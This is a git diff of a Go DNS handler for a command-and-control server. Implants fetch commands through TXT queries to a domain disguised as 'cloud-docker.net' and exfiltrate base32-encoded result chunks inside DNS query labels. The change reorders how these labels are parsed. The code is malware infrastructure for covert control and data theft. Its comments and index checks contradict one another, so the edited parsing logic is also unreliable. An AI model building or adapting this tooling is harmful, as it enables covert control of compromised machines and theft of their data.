@@ -80,15 +80,14 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 			TODO: have different endpoints for hiding (not cmd, res) (maybe c, r)?
 				TXT for C2 commands/results
 				command format: `<implant-id>.cmd.cloud-docker.net`
-				sending results format: `<implant-id>.res.<encoded/encrypted-result>.cloud-docker.net` // TODO: have result ID here? or just one task at a time
+				sending results format: `<implant-id>.<encoded/encrypted-result>.res.cloud-docker.net` // TODO: have result ID here? or just one task at a time
 		*/
 
 		// TODO: check		if len(labels) < 3  { ?
 
 		// domainLabels := strings.Split(questionName, ".")
 
-		switch labels[1] {
-		case "cmd": // implant is requesting command
+		if labels[1] == "cmd" { // implant is requesting command
 			if pendingCmds, ok := h.commands[implantID]; ok {
 				if len(pendingCmds) > 0 {
 					cmd := pendingCmds[0]
@@ -98,11 +97,12 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 					reply.Answer = []dns.RR{emptyTXT(q.Name)}
 				}
 			}
-		case "res": // implant is sending result of running command
-			// sending results format: `<implant-id>.res.<encoded/encrypted-result>.cloud-docker.net` // TODO: have result ID here? or just one task at a time
-			// labels: [implant_id, "res", chunkData, chunkIndex, domain...]
+		} else if labels[3] == "res" { // implant is sending result of running command
+			// sending results format: `<implant-id>.<chunk-index>.<encoded/encrypted-result-chunk>.res.cloud-docker.net` // TODO: have result ID here? or just one task at a time
+			// labels: [implant_id, chunkData, "res", chunkIndex, domain...]
 			// TODO: fix this so one of the labels is how much total chunkDatas there are?
 			// RN: this implementation only allows for one result for each implant -> make map of cmdTask ids -> results
+			// TODO: handle chunk-id
 			chunk := labels[2]
 			data, err := base32.StdEncoding.DecodeString(chunk)
 			if err != nil {
@@ -111,7 +111,7 @@ func (h *DNSHandler) ServeDNS(w dns.ResponseWriter, req *dns.Msg) {
 				h.results[implantID] = append(h.results[implantID], data)
 			}
 			reply.Answer = []dns.RR{emptyTXT(q.Name)}
-		default:
+		} else {
 			reply.Answer = []dns.RR{emptyTXT(q.Name)}
 		}
 	case dns.TypeSOA:
